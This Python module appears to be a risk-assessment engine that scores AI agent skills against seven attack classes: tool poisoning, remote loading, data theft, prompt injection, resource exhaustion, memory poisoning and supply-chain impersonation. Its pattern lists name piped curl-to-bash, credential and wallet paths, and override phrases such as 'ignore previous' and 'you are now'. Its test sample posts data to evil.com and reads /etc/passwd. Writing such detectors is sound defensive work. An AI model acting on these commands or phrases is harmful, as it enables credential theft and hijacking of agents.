#!/usr/bin/env python3
"""
Expert Mode - 行为判定引擎
Risk Assessment Engine
"""

from typing import Dict, List, Optional


class RiskRule:
    """风险规则 - 基于7类恶意Skill攻击"""
    
    # 第1类: 工具投毒
    TOOL_POISONING = {
        "base64 -d": 80,
        "base64 -D": 80,
        "b64decode": 70,
        "zlib.decompress": 60,
        "/etc/passwd": 90,
        "/etc/shadow": 100,
        "sudo": 80,
        "su ": 80,
    }
    
    # 第2类: 远程指令加载
    REMOTE_LOAD = {
        "curl|bash": 100,
        "curl -s": 50,
        "wget": 70,
        "glot.io": 80,
        "pastebin": 70,
        "rentry.co": 70,
        "91.92.242": 90,  # 恶意IP
    }
    
    # 第3类: 数据窃取
    DATA_EXFIL = {
        "/Desktop/": 50,
        "/Documents/": 50,
        "/Downloads/": 50,
        ".ssh/": 80,
        ".gnupg/": 80,
        "chrome": 60,
        "firefox": 60,
        "keychain": 90,
        "wallet": 90,
        "requests.post": 50,
        "urllib.request": 50,
    }
    
    # 第4类: 提示词注入
    PROMPT_INJECTION = {
        "ignore previous": 80,
        "ignore all": 80,
        "system prompt": 70,
        "you are now": 70,
        "dev mode": 60,
        "debug mode": 60,
    }
    
    # 第5类: 资源耗尽
    RESOURCE_EXHAUSTION = {
        "while True": 40,
        "for _ in range": 30,
        "retry": 20,
        "max_retries": 20,
    }
    
    # 第6类: 记忆污染
    MEMORY_POLLUTION = {
        "SOUL.md": 90,
        "MEMORY.md": 90,
        "memory/": 70,
        "write_memory": 80,
    }
    
    # 第7类: 供应链冒充
    SUPPLY_CHAIN = {
        "openclaw": 10,  # 需要上下文判断
        "official": 10,
    }
    
    @classmethod
    def match(cls, text: str) -> List[Dict]:
        """匹配规则 - 基于7类恶意Skill攻击"""
        findings = []
        text_lower = text.lower()
        
        # 合并所有规则
        all_rules = {}
        all_rules.update(cls.TOOL_POISONING)
        all_rules.update(cls.REMOTE_LOAD)
        all_rules.update(cls.DATA_EXFIL)
        all_rules.update(cls.PROMPT_INJECTION)
        all_rules.update(cls.RESOURCE_EXHAUSTION)
        all_rules.update(cls.MEMORY_POLLUTION)
        
        # 高优先级规则
        for pattern, score in all_rules.items():
            if pattern.lower() in text_lower:
                findings.append({
                    "pattern": pattern,
                    "score": score,
                    "severity": "HIGH" if score >= 70 else "MEDIUM",
                    "description": cls._describe(pattern)
                })
                
        return findings
    
    @classmethod
    def _describe(cls, pattern: str) -> str:
        """规则描述"""
        descriptions = {
            "/etc/shadow": "尝试读取系统凭据文件",
            "/etc/passwd": "尝试读取用户信息文件",
            "eval(": "动态代码执行，风险极高",
            "exec(": "动态代码执行，风险极高", 
            "__import__": "动态导入，可能加载恶意模块",
            "os.system": "执行系统命令，风险高",
            "shell=True": "shell命令执行，风险高",
            "base64.b64decode": "Base64解码，可能混淆恶意代码",
            "socket.connect": "网络连接，可能外传数据",
            "requests.post": "网络请求，可能外传数据",
            "fork": "创建新进程，可能恶意子进程",
            "cron": "计划任务，可能持久化",
        }
        return descriptions.get(pattern, f"触发风险规则: {pattern}")


class RiskAssessor:
    """风险评估器"""
    
    def __init__(self):
        self.rule = RiskRule()
        
    def assess(self, findings: List[Dict], behaviors: List[Dict] = None) -> Dict:
        """
        评估风险
        
        Args:
            findings: 静态扫描发现
            behaviors: 沙箱行为监控
            
        Returns:
            风险评估结果
        """
        # 计算基础分
        risk_score = 0
        all_findings = list(findings)
        
        # 静态发现加分
        for f in findings:
            risk_score += f.get("score", 0)
            
        # 沙箱行为加分
        if behaviors:
            for b in behaviors:
                risk_score += b.get("risk", 0)
                all_findings.append(b)
                
        # 去重
        risk_score = min(risk_score, 150)  # 上限150
        
        # 确定等级
        level = self._get_level(risk_score)
        
        # 生成建议
        recommendation = self._get_recommendation(risk_score, all_findings)
        
        return {
            "risk_score": risk_score,
            "risk_level": level,
            "findings": all_findings,
            "recommendation": recommendation
        }
        
    def _get_level(self, score: int) -> str:
        """确定风险等级"""
        if score >= 100:
            return "CRITICAL"
        elif score > 60:
            return "HIGH"
        elif score > 30:
            return "MEDIUM"
        elif score > 10:
            return "LOW"
        else:
            return "SAFE"
            
    def _get_recommendation(self, score: int, findings: List[Dict]) -> str:
        """生成处置建议"""
        # 检查是否有严重发现
        critical_patterns = ["/etc/shadow", "eval(", "exec(", "反弹", "shell=True"]
        has_critical = any(
            any(p in f.get("pattern", "") or p in f.get("description", "") 
                for p in critical_patterns)
            for f in findings
        )
        
        if score > 100 or has_critical:
            return "🚫 立即拦截 - 严重风险"
        elif score > 60:
            return "❌ 建议拦截 - 高风险"
        elif score > 30:
            return "⚠️ 需人工确认 - 中风险"
        elif score > 10:
            return "📝 记录通过 - 低风险"
        else:
            return "✅ 安全通过"


def assess_code_risk(code: str) -> Dict:
    """
    快速评估代码风险
    
    Args:
        code: 源代码
        
    Returns:
        风险评估结果
    """
    assessor = RiskAssessor()
    
    # 静态代码分析
    findings = RiskRule.match(code)
    
    # 评估
    result = assessor.assess(findings)
    
    return result


if __name__ == "__main__":
    # 测试
    test_code = """
    import os
    import subprocess
    
    # 危险操作
    eval("os.system('ls')")
    
    # 网络
    import requests
    requests.post("http://evil.com", data={"key": "value"})
    
    # 文件
    with open("/etc/passwd", "r") as f:
        data = f.read()
    """
    
    result = assess_code_risk(test_code)
    import json
    print(json.dumps(result, indent=2, ensure_ascii=False))
